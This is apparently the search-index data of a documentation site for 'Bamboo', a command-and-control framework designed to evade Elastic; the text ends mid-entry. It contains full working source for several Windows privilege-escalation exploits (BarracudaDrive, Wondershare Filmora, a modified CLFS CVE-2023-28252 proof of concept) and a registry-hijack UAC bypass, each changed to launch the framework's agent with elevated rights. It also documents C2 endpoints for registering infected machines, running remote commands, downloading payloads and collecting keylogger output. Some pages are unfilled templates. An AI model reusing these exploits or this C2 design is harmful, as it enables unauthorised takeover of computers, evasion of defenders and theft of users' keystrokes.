{"config":{"lang":["en"],"separator":"[\\s\\-]+","pipeline":["stopWordFilter"]},"docs":[{"location":"index.html","title":"Introduction","text":"<p>Bamboo is a Command &amp; Control (C2) Framework that consists of three main components: Bamboo Client, Bamboo Teamserver, and Bamboo Agent. These components work together to allow users to have an easy yet scalable experience to do penetration testing or general testing of evading Elastic.  Bamboo offers multiple pre-built evasion techniques that are well tested and modified to evade Elastic. Moreover, there are multiple built-in third party exploits that users can use initially to try out Bamboo.</p> <p></p> <p>This website documents the various components of the Bamboo Framework, including its evasion tools, pre-built exploits and post-exploitation tools.</p>"},{"location":"evasion.html","title":"Evasion","text":"<p>This page details the evasion techniques included in Bamboo as well as how they were implemented.</p>"},{"location":"evasion.html#name","title":"Name","text":""},{"location":"evasion.html#description","title":"Description","text":""},{"location":"evasion.html#implementation","title":"Implementation","text":""},{"location":"exploits.html","title":"Exploits","text":""},{"location":"exploits.html#overview","title":"Overview","text":"<p>This section documents the exploits that come pre-loaded in Bamboo.</p> Application / Service Vulnerable Version(s) CVE Identifier Wacom Driver 6.3.45-1 CVE-2023-32162 BarracudaDrive 6.5 CVE-2020-23834 Wondershare Filmora 12.2.9.2233 and below CVE-2023-31747 Wondershare Dr. Fone 12.3.14 CVE-2021-44596 Windows Common Log File System Windows 11 21H2 Windows 11 22H2 CVE-2023-28252 UAC Bypass - -"},{"location":"exploits.html#wacom-driver","title":"Wacom Driver","text":""},{"location":"exploits.html#description","title":"Description","text":"<p>Wacom specialises in pen displays and tablets for designers. These products require the Wacom Driver to be installed. Luca Barile discovered several vulnerabilities, including one which allowed for Local Privilege Escalation (LPE). The exploit abuses various flaws in the design of the Wacom\u2019s utilities, including especially the implementation of Remove.exe for the backup process. Full details can be found on Luca\u2019s blog.</p>"},{"location":"exploits.html#implementation","title":"Implementation","text":"<p>Majority of the original code from Luca\u2019s LPE exploit was kept. However, the original exploit would launch a command prompt. In Bamboo, the exploit is modified to execute the agent.exe file which will be located on the user\u2019s desktop. This is achieved by instead injecting a Wacom command to launch the agent.exe file as shown below.</p> <pre><code>string input1_line1 = \"/debug \\\\\"\" + pathInstallerDAT + \"\\\\\" /silent\";\nstring input1_line2 = \"[PrivilegeEscalation]\";\n\nstring username = Environment.UserName;\nstring input1_line3 = @\"Execute;1000;!WINDOWS!\\\\\\\\..\\\\\\\\Users\\\\\\\\\" + username + @\"\\\\\\\\Desktop\\\\\\\\agent.exe\";\nstring input1_line4 = \"DONE\";\nstring input2_line1 = \"/command PrivilegeEscalation /silent /debug \\\\\"\";\n</code></pre>"},{"location":"exploits.html#barracudadrive","title":"BarracudaDrive","text":""},{"location":"exploits.html#description_1","title":"Description","text":"<p>BarracudaDrive is a web-based file explorer that provides users with a convenient way to access and manage files on local machines or network-attached storage devices. This application features file sharing, file management, advanced server side scripting language and collaboration capabilities. The application\u2019s vulnerability exploits weak and insecure folder permissions.</p>"},{"location":"exploits.html#implementation_1","title":"Implementation","text":"<p>Exploit Code</p> <p>The team constructed the exploit code and it is illustrated below:</p> <pre><code>package main\n\nimport (\n    \"fmt\"\n    \"os\"\n    \"os/exec\"\n    \"path/filepath\"\n    \"io\"\n    \"time\"\n)\nfunc writeWondershare() {\n    // Get current user name from environment var\n    userProfile := os.Getenv(\"USERPROFILE\")\n    if userProfile == \"\" {\n        fmt.Println(\"Failed to get user profile directory\")\n        return\n    }\n    username := filepath.Base(userProfile)\n\n    //  opy the agent.exe file to C:\\Users\\[username]]\\Desktop\\bd.exe\n    agentFilepath := \"C:\\\\Users\\\\\" + username + \"\\\\Desktop\\\\agent.exe\"\n    wondershareFilepath := \"C:\\\\bd\\\\bd.exe\"\n\n    agentFile, err := os.Open(agentFilepath)\n    if err != nil {\n        fmt.Printf(\"Error opening agent.exe: %v\", err)\n        return\n    }\n    defer agentFile.Close()\n\n    wondershareFile, err := os.Create(wondershareFilepath)\n    if err != nil {\n        fmt.Printf(\"Error creating bd.exe: %v\", err)\n        return\n    }\n    defer wondershareFile.Close()\n\n    _, err = io.Copy(wondershareFile, agentFile)\n    if err != nil {\n        fmt.Printf(\"Error copying agent.exe into bd.exe: %v\", err)\n        return\n    }\n}\n\n// restart bd service\nfunc restartbd() error {\n    serviceName := \"bd\"\n    fmt.Println(\"Stopping bd service...\")\n    cmd1 := exec.Command(\"sc\", \"stop\", serviceName)\n    err := cmd1.Run()\n    if err != nil {\n        fmt.Println(err)\n    }\n\n    // wait for service to stop till we call writeWondershare()\n    fmt.Println(\"Waiting for 30 seconds...\")\n    time.Sleep(30 * time.Second)\n    writeWondershare()\n\n    fmt.Println(\"Starting bd service...\")\n    cmd2 := exec.Command(\"sc\", \"start\", serviceName)\n    err = cmd2.Run()\n    if err != nil {\n        fmt.Println(err)\n    }\n    return nil\n}   \n\nfunc main() {\n    restartbd()\n    fmt.Printf(\"Exploit complete\")\n}\n</code></pre> <p>The program stops the application\u2019s service, copies the content of Bamboo\u2019s agent executable into C:\\bd\\bd.exe and starts the service again after 30 seconds.</p> <p>Creation of Manifest File</p> <p>In order to execute the Service Control (sc) utility to restart the service, administrative privileges are required. To overcome this, a manifest file was needs to be embedded into the executable. The manifest file (bd.manifest.exe) is first created with the following content:</p> <pre><code>&lt;?xml version=\"1.0\" encoding=\"UTF-8\"?&gt;\n&lt;assembly xmlns=\"urn:schemas-microsoft-com:asm.v1\" manifestVersion=\"1.0\"&gt;\n    &lt;trustInfo xmlns=\"urn:schemas-microsoft-com:asm.v3\"&gt;\n        &lt;security&gt;\n            &lt;requestedPrivileges&gt;\n                &lt;requestedExecutionLevel level=\"requireAdministrator\" uiAccess=\"false\"/&gt;\n            &lt;/requestedPrivileges&gt;\n        &lt;/security&gt;\n    &lt;/trustInfo&gt;\n&lt;/assembly&gt;\n</code></pre> <p>In the manifest file, the <code>requestedExecutionLevel</code> was specified as <code>requireAdministrator</code>. This configuration informs Windows OS that the application necessitates elevated privileges to function correctly. This manifest file is then converted into a .syso file using the rsrc tool by akavel.</p> <pre><code>.\\rsrc -manifest bd.exe.manifest -o bd.syso\n</code></pre> <p>Lastly, build the exploit with <code>go build</code> . The Go compiler will detect the .syso file and embed it in the final executable.</p>"},{"location":"exploits.html#wondershare-filmora","title":"Wondershare Filmora","text":""},{"location":"exploits.html#description_2","title":"Description","text":"<p>Filmora is a video editor by Wondershare. The specific vulnerable component is NativePush (Build 1.0.0.7), which contains an unquoted service path. The unquoted service path allows attackers to execute their own file in place of the actual service file, allowing it to be executed with SYSTEM privileges when the service is run. Running the service requires administrator privileges. The vulnerability was authored by Thurein Soe.</p>"},{"location":"exploits.html#implementation_2","title":"Implementation","text":"<p>Exploit Code</p> <p>The exploit for Filmora was written by the team in Golang:</p> <pre><code>package main\n\nimport (\n    \"fmt\"\n    \"os\"\n    \"os/exec\"\n    \"path/filepath\"\n    \"io\"\n)\n\n// Restart NativePushService\nfunc restartNativePushService() error {\n    serviceName := \"NativePushService\"\n    cmd1 := exec.Command(\"sc\", \"stop\", serviceName)\n    err := cmd1.Run()\n    if err != nil {\n        fmt.Println(err)\n    }\n    cmd2 := exec.Command(\"sc\", \"start\", serviceName)\n    err = cmd2.Run()\n    if err != nil {\n        fmt.Println(err)\n    }\n    return nil\n}   \n\nfunc writeWondershare() {\n    // Get current user name from environment var\n    userProfile := os.Getenv(\"USERPROFILE\")\n    if userProfile == \"\" {\n        fmt.Println(\"Failed to get user profile directory\")\n        return\n    }\n    username := filepath.Base(userProfile)\n\n    // Copy the agent.exe file to C:\\Users\\[username]]\\Desktop\\Wondershare.exe\n    agentFilepath := \"C:\\\\Users\\\\\" + username + \"\\\\Desktop\\\\agent.exe\"\n    wondershareFilepath := \"C:\\\\Users\\\\\" + username + \"\\\\AppData\\\\Local\\\\Wondershare\\\\Wondershare.exe\"\n\n    agentFile, err := os.Open(agentFilepath)\n    if err != nil {\n        fmt.Printf(\"Error opening agent.exe: %v\", err)\n        return\n    }\n    defer agentFile.Close()\n\n    wondershareFile, err := os.Create(wondershareFilepath)\n    if err != nil {\n        fmt.Printf(\"Error creating wondershare.exe: %v\", err)\n        return\n    }\n    defer wondershareFile.Close()\n\n    _, err = io.Copy(wondershareFile, agentFile)\n    if err != nil {\n        fmt.Printf(\"Error copying agent.exe into wondershare.exe: %v\", err)\n        return\n    }\n}\n\nfunc main() {\n    // Write the Wondershare.exe file\n    writeWondershare()\n\n    // Restart NativePushService\n    err := restartNativePushService()\n    if err != nil {\n        fmt.Println(err)\n        return\n    }\n\n    fmt.Printf(\"Exploit complete\")\n}\n\n</code></pre> <p>In summary, this creates the agent.exe file in the unquoted service path, then restarts the NativePushService, causing the agent.exe file to be executed with SYSTEM integrity context. </p> <p>Creation of Manifest File</p> <p>Similarly to the BarracudaDrive exploit above, administrator privileges are needed to use the Service Control Utility (sc.exe) to restart the service. This means the exploit file must be run with administrative privileges. To achieve this, a manifest file (filmora.exe.manifest) must be embedded which specifies the <code>requestExecutionLevel</code> as <code>requireAdministrator</code> . The manifest file is shown below.</p> <pre><code>&lt;?xml version=\"1.0\" encoding=\"UTF-8\"?&gt;\n&lt;assembly xmlns=\"urn:schemas-microsoft-com:asm.v1\" manifestVersion=\"1.0\"&gt;\n    &lt;trustInfo xmlns=\"urn:schemas-microsoft-com:asm.v3\"&gt;\n        &lt;security&gt;\n            &lt;requestedPrivileges&gt;\n                &lt;requestedExecutionLevel level=\"requireAdministrator\" uiAccess=\"false\"/&gt;\n            &lt;/requestedPrivileges&gt;\n        &lt;/security&gt;\n    &lt;/trustInfo&gt;\n&lt;/assembly&gt;\n</code></pre> <p>Afterwards, the manifest file is generated into a .syso file using rsrc by akavel</p> <pre><code>.\\rsrc -manifest filmora.exe.manifest -o filmora.syso\n</code></pre> <p>Finally, the exploit is built with <code>go build</code> . Go detects the .syso file upon compilation and embed the file into the final executable.</p>"},{"location":"exploits.html#wondershare-dr-fone","title":"Wondershare Dr. Fone","text":""},{"location":"exploits.html#description_3","title":"Description","text":""},{"location":"exploits.html#implementation_3","title":"Implementation","text":""},{"location":"exploits.html#windows-common-log-file-system","title":"Windows Common Log File System","text":""},{"location":"exploits.html#description_4","title":"Description","text":"<p>The Windows Common Log File System (CLFS) is a high performing, general-purpose logging system that helps applications keep track of important events and recover from failures. It was discovered that a vulnerability exists due to an out of bound read and write flaw, leading to the execution of arbitrary code. The specific Windows 11 builds affected by this vulnerability are:</p> <p>The specific Windows 11 builds affected by this vulnerability are:</p> <ul> <li>Windows 11 22H1 (fixed in version 10.0.22000.1817)</li> <li>Windows 11 22H2 (fixed in version 10.0.22621.1555)</li> </ul>"},{"location":"exploits.html#implementation_4","title":"Implementation","text":"<p>The original PoC was developed by Fortra, a company that provides cybersecurity and automation solutions (www.fortra.com, n.d.). The execution of the original PoC requires three parameters: token offset, flag and the program to be executed. For instance, if the team wishes to elevate calc.exe to SYSTEM privileges, the command will be clfs_eop.exe 1208 1 calc.exe. Our team has modified the original PoC to automatically launch the agent executable with SYSTEM privileges. All credit goes to the original author, Fotra for discovering this vulnerability and creating the original PoC exploit.</p> <p>Hardcoded Values</p> <p>The code snippet shown below pertains to the manage_args function within clfs_eop.cpp. The team hardcoded the values of the token offset and flag to 1208 and 1 respectively. This eliminates the need for user input to these parameters. Setting these parameters directly in the code simplifies the execution process and ensures that the program being launched always has SYSTEM privileges.</p> <pre><code>void manage_args(int argc, TCHAR* argv[]) {\n\n      // hardcoded values\n    argv[1] = (TCHAR*)\"1208\";\n    argv[2] = (TCHAR*)\"1\";\n\n    token_offset = atoi((CHAR*)argv[1]);\n    if (token_offset == 0) {\n        printf(\"[+] Invalid token offset argument, must be decimal number\\n\");\n        exit(1);\n    }\n\n    flag = atoi((CHAR*)argv[2]);\n    if (flag == 0) {\n        printf(\"[+] Invalid token offset argument, must be decimal number\\n\");\n        exit(1);\n    }\n\n    printf(\"\\n\\nARGUMENTS\\n\");\n    printf(\"[+] TOKEN OFFSET %x\\n\", token_offset);\n    printf(\"[+] FLAG %x\\n\\n\", flag);\n    return;\n}\n\n</code></pre> <p>Declare Global Variable for Current Username</p> <p>The code snippet shown below declares a global variable within clfs_eop.cpp. The function, getCurrentUsername retrieves the current username of the user and stores it in the global variable, currentUsername. It returns true on success and false on failure. This will be used in the to_trigger function which will be exhibited in the next code snippet.</p> <pre><code>// global variable currentUsername\nTCHAR currentUsername[500]; \n// function to retrieve current user's username bool getCurrentUsername() { \n  DWORD size = sizeof(currentUsername) / sizeof(currentUsername[0]); \n\n  if (GetUserName(currentUsername, &amp;size)) {        \n     // ensures null-termination        \n     currentUsername[size] = '\\0'; \n     std::wcout &lt;&lt; L\"CURRENT USER=\" &lt;&lt; currentUsername &lt;&lt; std::endl; \n     return true; \n\n  } else { \n     std::cerr &lt;&lt; \"Error: \" &lt;&lt; GetLastError() &lt;&lt; std::endl; \n     return false; \n    }\n}\n\n</code></pre> <p>Modify to_trigger()</p> <p>The code snippet shown below pertains to the to_trigger function within clfs_eop.cpp. In the original code, the program it executes is notepad.exe by default. Instead of launching notepad.exe, the team modified it to launch the agent executable located in the user\u2019s directory and the team used the global variable declared in the previous code snippet and parsed it in the %s to complete the full file path. </p> <pre><code> TCHAR agentPath[1000];         \n\n// launch agent.exe within the current user's directory         _stprintf_s(agentPath,_T(\"C:\\\\Users\\\\%s\\\\Desktop\\\\agent.exe\"), currentUsername);         \n\n// check if we became SYSTEM         \nif (_tcscmp(username, _T(\"SYSTEM\")) == 0) { \n  printf(\"WE ARE SYSTEM\\n\");            \n  TCHAR fpath[1000]; \n\n  _stprintf_s(fpath, _T(\"%s\"), agentPath);\n  _tprintf(_T(\"Executing: %s\\n\"), fpath);   \n  _tsystem(fpath);      \n} else {            \n  printf(\"NOT SYSTEM\\n\");       \n}\n\n</code></pre> <p>The getCurrentUsername function has also been called in the first line of the main function as follows:</p> <pre><code>int main(int argc, TCHAR* argv[]) {     \n  getCurrentUsername();     \n  manage_args(argc, argv);  \n  getVirtualAddress();  \n  InitEnvironment();    \n  doFirstAlloc();   \n  createInitialLogFile();   \n  fun_prepare();    \n  to_trigger();     \n  exit(1);  \n  return 0; \n}\n</code></pre> <p>With this modification, it elevates our team\u2019s agent executable to SYSTEM privileges when it is being launched. The CLFS exploit, both original and modified, triggers two Malware Detection Alert in Elastic. The description of the two alerts are:</p> <ul> <li>File event with process explorer.exe, parent process userinit.exe, file clfs_eop.exe</li> <li>Process event with exploit.exe, parent process cmd.exe, file clfs_eop.exe</li> </ul> <p>This indicates that Elastic statically detects the exploit when it is first dropped onto the local machine\u2019s disk and again when executed.</p>"},{"location":"exploits.html#uac-bypass","title":"UAC Bypass","text":"<p>This is not an exploit, but is used in conjunction with certain exploits such as Filmora and BarracudaDrive.</p>"},{"location":"exploits.html#description_5","title":"Description","text":"<p>UAC is a security feature in Windows which requires applications to prompt for consent before an administrative task can be performed. This prevents malicious applications from running on your Windows device. The left image shows an example of a normal user receiving a UAC prompt, while the right image shows an example of an administrative user receiving a UAC prompt. A normal user requires an administrators login credentials while an administrative user just has a \u201cYes\u201d and \u201cNo\u201d consent box.</p> <p></p> <p></p> <p>For more information on UAC, see this article from Microsoft. </p> <p>A UAC Bypass ONLY works if the current user is in the administrators group. It allows an application to bypass the consent prompt and run with administrator privileges. There are various methods to achieve a UAC Bypass as shown by HackTricks. In Bamboo, the UAC Bypass is achieved by modifying registry keys for the Windows computerdefaults.exe utility.</p>"},{"location":"exploits.html#implementation_5","title":"Implementation","text":"<p>The UAC Bypass script was written by the team in Golang:</p> <pre><code>package main\n\nimport (\n    \"fmt\"\n    \"golang.org/x/sys/windows/registry\"\n    \"os/exec\"\n    \"os\"\n    \"path/filepath\"\n)\n\nfunc main() {\n\n    // Get current user name from environment var and determine location of payload to execute as admin\n    userProfile := os.Getenv(\"USERPROFILE\")\n    if userProfile == \"\" {\n        fmt.Println(\"Failed to get user profile directory\")\n        return\n    }\n    username := filepath.Base(userProfile)\n    payloadLocation := \"C:\\\\Users\\\\\" + username + \"\\\\Desktop\\\\payload.exe\"\n    fmt.Printf(\"Payload location set as %v\\n\", payloadLocation)\n\n    // Modify registry keys\n    keyPath := `Software\\Classes\\ms-settings\\Shell\\Open\\command`\n    if err := setRegistryValue(registry.CURRENT_USER, keyPath, \"DelegateExecute\", \"\"); err != nil {\n        fmt.Printf(\"Error setting registry value: %v\\n\", err)\n        return\n    }\n    fmt.Printf(\"Successfully set registry value: HKCU\\\\%s\\\\DelegateExecute\\n\", keyPath)\n\n    if err := setRegistryValue(registry.CURRENT_USER, keyPath, \"\", payloadLocation); err != nil {\n        fmt.Printf(\"Error setting registry value: %v\\n\", err)\n        return\n    }\n    fmt.Printf(\"Successfully set registry value: HKCU\\\\%s (Default)\\n\", keyPath)\n\n    // Launch computerdefaults.exe\n    cmd := exec.Command(\"cmd\", \"/C\", \"start computerdefaults.exe\")\n    err := cmd.Start()\n    if err != nil {\n        fmt.Printf(\"Error starting computerdefaults.exe: %v\\n\", err)\n        return\n    }\n    fmt.Println(\"Successfully started computerdefaults.exe\")\n}\n\n// Function to set a registry value\nfunc setRegistryValue(root registry.Key, keyPath, valueName, value string) error {\n    k, _, err := registry.CreateKey(root, keyPath, registry.SET_VALUE)\n    if err != nil {\n        return fmt.Errorf(\"error creating or opening registry key: %v\", err)\n    }\n    defer k.Close()\n\n    if err := k.SetStringValue(valueName, value); err != nil {\n        return fmt.Errorf(\"error setting registry value: %v\", err)\n    }\n\n    return nil\n}\n</code></pre> <p>In summary, it creates 2 registry keys and launches the computerdefaults.exe process. This works because when computerdefaults.exe is launched, it looks for the registry key HKCU\\Software\\Classes\\ms-settings\\shell\\open\\command which by default does not exist. If the key exists, it looks for the value HKCU\\Software\\Classes\\ms-settings\\shell\\open\\command\\DelegateExecute. If this value is found, computerdefaults.exe will look for the default value in HKCU\\Software\\Classes\\ms-settings\\shell\\open\\command. computerdefaults.exe follows the command found at the value in HKCU\\Software\\Classes\\ms-settings\\shell\\open\\command\\ when it starts. Thus, the team has directed it to launch our exploit which will always be dropped as \u201cpayload.exe\u201d in the user\u2019s Desktop.</p>"},{"location":"test.html","title":"test","text":""},{"location":"test.html#overview","title":"Overview","text":"<p>The Bamboo Teamserver's APIs are used by the Client and Agent to access various functionalities of the teamserver and communicate with one another.</p>"},{"location":"test.html#base-url","title":"Base URL","text":"<pre><code>https://[teamserver_ip]:[port]\n</code></pre> <p>For example, if your teamserver is hosted locally on port 4000, your base URL would be</p> <pre><code>https://127.0.0.1:4000\n</code></pre>"},{"location":"test.html#authorization","title":"Authorization","text":"<p>Authentication and authorization is required for requests to these APIs unless otherwise stated. This is handled using JWT Tokens.</p> <pre><code>{Provide an example request with JWT Token authentication.}\n</code></pre>"},{"location":"test.html#http-status-codes","title":"HTTP status codes","text":"<p>The {product} APIs use the following standard HTTP response codes:</p> Status code Message Description <code>200 OK</code> Request succeeds. {description}"},{"location":"test.html#errors","title":"Errors","text":"<p>{This section is optional.}</p> <p>The {product} APIs use the following error types:</p> Error Description {ExampleErrorType} {Failure in ...}"},{"location":"test.html#exampleerrortype","title":"ExampleErrorType","text":"Field Type Description {errorType} {enum} {Predefined error codes. Possible enum values are x, y, ..., and z.} {errorMessage} {string} {Additional information about why the error occurs.}"},{"location":"test.html#endpoint-name","title":"{Endpoint name}","text":"<p>{Provide a one-line description of what the API does. Starts with a verb in the indicative mood. For example, \"Retrieves a user by <code>userID</code>\".}</p>"},{"location":"test.html#endpoint","title":"Endpoint","text":"<pre><code>{METHOD} /{request-url}/{{path-parameter}}\n</code></pre>"},{"location":"test.html#description","title":"Description","text":"<p>{Explain what the endpoint does.}</p>"},{"location":"test.html#authorization_1","title":"Authorization","text":"<p>The {authorization method} is required for each API request.</p>"},{"location":"test.html#request-schema","title":"Request schema","text":""},{"location":"test.html#path-parameters","title":"Path parameters","text":"<p>{This section is optional.}</p> Path parameter Type Required? Description {id} string Required {Unique identifier of user}"},{"location":"test.html#query-parameters","title":"Query parameters","text":"<p>{This section is optional.}</p> Query parameter Type Required? Description {pageSize} int Optional {The number of items to be returned in a single request. The default value is N.}"},{"location":"test.html#header-parameters","title":"Header parameters","text":"<p>{This section is optional.}</p> Header parameter Type Required? Description {Content-Type} string Required {Media type of the resource. Must be an object.}"},{"location":"test.html#request-body","title":"Request body","text":"<p>{This section is optional.}</p> Field Type Required? Description {id} string Required {Unique identifier of the user} {name} string Optional {Name of the user}"},{"location":"test.html#request-example","title":"Request example","text":"<pre><code>{Provide an example of the API request, filled with sample values.}\n</code></pre>"},{"location":"test.html#response-schema","title":"Response schema","text":"Status code Schema Description"},{"location":"test.html#response-example","title":"Response example","text":"<pre><code>{Provide an example of the API response, filled with sample values.}\n</code></pre>"},{"location":"API_Reference/_overview.html","title":"Overview","text":""},{"location":"API_Reference/_overview.html#introduction","title":"Introduction","text":"<p>This section documents the Teamserver's endpoints. One of the main forms of communication that the Teamserver uses is Hypertext Transfer Protocol Secure (HTTPS). By using flask, blueprint, and flask_jwt_extended library for Secure Sockets Layer (SSL) and JSON Web Token (JWT), this ensures that all data exchanged between clients and the server is encrypted and secure, protecting sensitive information from unauthorized access. </p> <p>Flask Blueprint allows related APIs to be grouped together in the same file, under a common prefix. Flask flask_jwt_extended on the other hand provides an easy and secure way to handle JSON Web Tokens (JWTs) for authentication and authorization.</p>"},{"location":"API_Reference/_overview.html#base-url","title":"Base URL","text":"<pre><code>https://[teamserver_ip]:[port]\n</code></pre> <p>For example, if your teamserver is hosted locally on port 4000, your base URL would be</p> <pre><code>https://127.0.0.1:4000\n</code></pre>"},{"location":"API_Reference/_overview.html#list-of-endpoints","title":"List of Endpoints","text":"<p>The table below shows the list of all RESTful APIs in Bamboo Teamserver, which can be found in /teamserver/api.</p> Endpoint Description POST /agent/heartbeat For agent to ping at regular intervals to indicate that it is alive POST /agent/initial_connection/register For agent to register initial connection POST /agent/agent_response For agent to send back the response of a command POST /download/ For agent to download a file from server GET /auth/ For clients to check if server is online POST /auth/login For user to log in to the server POST /auth/logout For user to log out of server POST /auth/check_agent_status To check an agent\u2019s status (dead, alive) POST /exploit/quit For user to exit the [exploit] command POST /exploit/send_config For user to send configurations for an exploit when using the [exploit] command POST /exploit/view_all For user to view all exploits in the database using the [exp] command POST /exploit/add For user to add exploits using the [add] command POST /exploit/delete For user to delete exploits using the [delete] command POST /exploit/exist To check if exploit exists POST /exploit/modify For user to modify an existing exploit in the database POST /handler_func/agent/display For user to view all agents using the [display] command POST /handler_func/use_agent For user to use an agent POST /handler_func/stop_agent For user to stop using an agent POST /handler_func/remove_agent For user to remove an agent from database POST /handler_func/handler/info_status For user to check the status of an agent POST /handler_func/handler/view_users For user to view all users in database POST /handler_func/handler/register_user For user to register a new user POST /handler_func/handler/delete_user For user to delete a user POST /handler_func/cmd For user to send commands to an agent to run in the target\u2019s terminal POST /handler_func/handler_output For user to print the response of a command from the agent POST /handler_func/teamchat For user to send a message to teamchat <p>There are a total of 5 prefixes used in Bamboo Teamserver with the flask blueprint library for all HTTPS APIs. All of the prefixes are organised together as they are for easier management.</p> Prefix Description Examples /auth For authentication and status related /login, /check_agent_status /agent Only for Bamboo Agent to request /heartbeat, /post_exploit/keylog /handler_func For Bamboo Client to request, does not involve Bamboo Agent /agent/display, /handler/delete_user /exploit For exploit related /send_config, /delete /postexp For post exploit related /keylog, /retrieve"},{"location":"API_Reference/agent.html","title":"/agent","text":""},{"location":"API_Reference/agent.html#agent-heartbeats","title":"Agent Heartbeats","text":"<p>Record Bamboo Agent heartbeat</p>"},{"location":"API_Reference/agent.html#endpoint","title":"Endpoint","text":"<pre><code>POST /agent/heartbeat\n</code></pre>"},{"location":"API_Reference/agent.html#description","title":"Description","text":"<p>Agent heartbeats endpoint is for Bamboo Agents to 'ping' after their initial connection. This API helps determine if a Bamboo Agent is still 'alive' and running. Heartbeat, is a mechanism used in Bamboo to ensure that an individual Bamboo Agent is still 'alive' and running. The initial connection will give Bamboo Agents 5 seconds before the next heartbeat is expected. After that, the Bamboo Agent will continue sending their heartbeat at random between 5 to 10 seconds. This endpoint will use the <code>model add_heartbeat</code> to repeatedly update the <code>collection heartbeats</code>.</p> <p>After obtaining the 2 data in the request body from Bamboo Agent, Bamboo Teamserver will take the time that the request was made and compare it with the expected_heartbeat column in the database. Refer to db collection heartbeats for more information.</p> <p>If the current time is later than the expected time, it would mean that the Bamboo Agent was 'dead' and it became 'alive' after a while. While if the current time matches the expected time for the next heartbeat, it would mean that the Bamboo Agent is 'punctual' and still alive.</p>"},{"location":"API_Reference/agent.html#request-schema","title":"Request schema","text":""},{"location":"API_Reference/agent.html#request-body","title":"Request body","text":"Field Type Description agent_identifier String Identifier of Bamboo Agent heartbeat Integer Seconds before the next heartbeat"},{"location":"API_Reference/agent.html#request-example","title":"Request example","text":"<pre><code>{\n    \"agent_identifier\": \"5zrire9a\",\n    \"heartbeat\": 8\n}\n</code></pre>"},{"location":"API_Reference/agent.html#response-schema","title":"Response schema","text":"Status Code Schema Description <code>200</code> {\"status\": \"alive\"} Success <code>404</code> {\"message\": \"Invalid Body\"} Invalid Body"},{"location":"API_Reference/agent.html#response-example","title":"Response example","text":"<pre><code>{\n    \"status\": \"alive\"\n}\n</code></pre>"},{"location":"API_Reference/agent.html#registering-agent","title":"Registering Agent","text":"<p>Register new Bamboo Agent</p>"},{"location":"API_Reference/agent.html#endpoint_1","title":"Endpoint","text":"<pre><code>POST /agent/initial_connection/register\n</code></pre>"},{"location":"API_Reference/agent.html#description_1","title":"Description","text":"<p>The Register Agent endpoint is called when a Bamboo Agent is executed. The Bamboo Agent will request for this endpoint to register itself into Bamboo Teamserver and using the <code>model check_agent_identifier</code>, Bamboo Teamserver will be able to generate unique agent identifiers and avoid duplicates.</p> <p>Bamboo Teamserver will create a new unique agent identifier for all Bamboo Agent. Once the agent identifier is created, Bamboo Teamserver will update the database in the <code>agents collection</code> using  the <code>model add_agent</code> with the new Bamboo Agent information. Not only that, also update the <code>heartbeat collection</code> using the <code>model add_heartbeat</code> and give the agent 5 seconds buffer time to request for the next heartbeat. For more details for the collections, do refer here for the <code>heartbeat collection</code> and here for the agents collection.</p> <p>After the procedure is completed, Bamboo Teamserver will broadcast to all connected Bamboo Clients that a new Bamboo Agent is connected, with its agent identifier. From there, Bamboo Client users will be able to interact and view the information using commands. For more information on commands, do refer to command.</p>"},{"location":"API_Reference/agent.html#request-schema_1","title":"Request schema","text":""},{"location":"API_Reference/agent.html#request-body_1","title":"Request body","text":"Field Type Description hostname String Hostname if infected machine publicIP String Public IP address of infected machine privateIP String Private IP address of infected machine Integrity String Privilege level of Bamboo Agent"},{"location":"API_Reference/agent.html#request-example_1","title":"Request example","text":"<pre><code>{\n    \"hostname\": \"bambooMachine\",\n    \"publicIP\": \"39.100.49.231\",\n    \"privateIP\": \"192.168.45.7\",\n    \"Integrity\": \"medium\"\n}\n</code></pre>"},{"location":"API_Reference/agent.html#response-schema_1","title":"Response schema","text":"Status Code Schema Description <code>200</code> {\"listener_status\": \"connected\", \"agent_identifier\", \"5zrire9a\"} Success <code>404</code> {\"message\": \"Invalid Body\"} Invalid Body"},{"location":"API_Reference/agent.html#response-example_1","title":"Response example","text":"<pre><code>{\n    \"listener_status\": \"connected\",\n    \"agent_identifier\": \"5zrire9a\"\n}\n</code></pre>"},{"location":"API_Reference/agent.html#command-response","title":"Command Response","text":"<p>Store response of command for <code>cmd</code> Bamboo Client command</p>"},{"location":"API_Reference/agent.html#endpoint_2","title":"Endpoint","text":"<pre><code>POST /agent/agent_response\n</code></pre>"},{"location":"API_Reference/agent.html#description_2","title":"Description","text":"<p>Command Response endpoint is part of the {<code>cmd</code> command} component. This endpoint receives the response of the Bamboo Agent after the Bamboo Client user sends a command over. Bamboo Teamserver will then update a dictionary in the global variable for /handler/handler_output API to receive it, which details are in here. </p>"},{"location":"API_Reference/agent.html#request-schema_2","title":"Request schema","text":""},{"location":"API_Reference/agent.html#request-body_2","title":"Request body","text":"Field Type Description agent_identifier String Identifier of Bamboo Agent response String Result of command (e.g. <code>whoami</code>)"},{"location":"API_Reference/agent.html#request-example_2","title":"Request example","text":"<pre><code>{\n    \"agent_identifier\": \"5zrire9a\",\n    \"response\": \"bambooMachine\\panda\"\n}\n</code></pre>"},{"location":"API_Reference/agent.html#response-schema_2","title":"Response schema","text":"Status Code Schema Description <code>200</code> {\"status\": \"success\", \"response\", \"bambooMachine\\panda\"} Success <code>404</code> {\"message\": \"Invalid Body\"} Invalid Body"},{"location":"API_Reference/agent.html#response-example_2","title":"Response example","text":"<pre><code>{\n    \"status\": \"success\",\n    \"response\": \"bambooMachine\\panda\"\n}\n</code></pre>"},{"location":"API_Reference/agent.html#file-download","title":"File Download","text":"<p>Download exploit files by name</p>"},{"location":"API_Reference/agent.html#endpoint_3","title":"Endpoint","text":"<pre><code>GET /agent/download/&lt;filename&gt;\n</code></pre>"},{"location":"API_Reference/agent.html#description_3","title":"Description","text":"<p>During exploiting phrase, if drop file is required, Bamboo Agent will request for this API to download the exploit file. All exploit files is located in <code>/exploits</code> folder</p>"},{"location":"API_Reference/agent.html#response-schema_3","title":"Response schema","text":"Status Code Schema Description <code>200</code> File Success <code>404</code> Null Invalid Body"},{"location":"API_Reference/agent.html#keylog-result","title":"Keylog Result","text":"<p>Store post exploit (<code>keylog</code>) result (keystrokes)</p>"},{"location":"API_Reference/agent.html#endpoint_4","title":"Endpoint","text":"<pre><code>POST /agent/post_exploit/keylog\n</code></pre>"},{"location":"API_Reference/agent.html#description_4","title":"Description","text":"<p>Keylog Result will be called by Bamboo Agent when Bamboo Client command the Bamboo Agent to stop recording keystrokes. There will be error checking to determine if there were any error, if there are no errors, Bamboo Teamserver will send the keystroke to the user via WebSocket.</p>"},{"location":"API_Reference/agent.html#request-schema_3","title":"Request 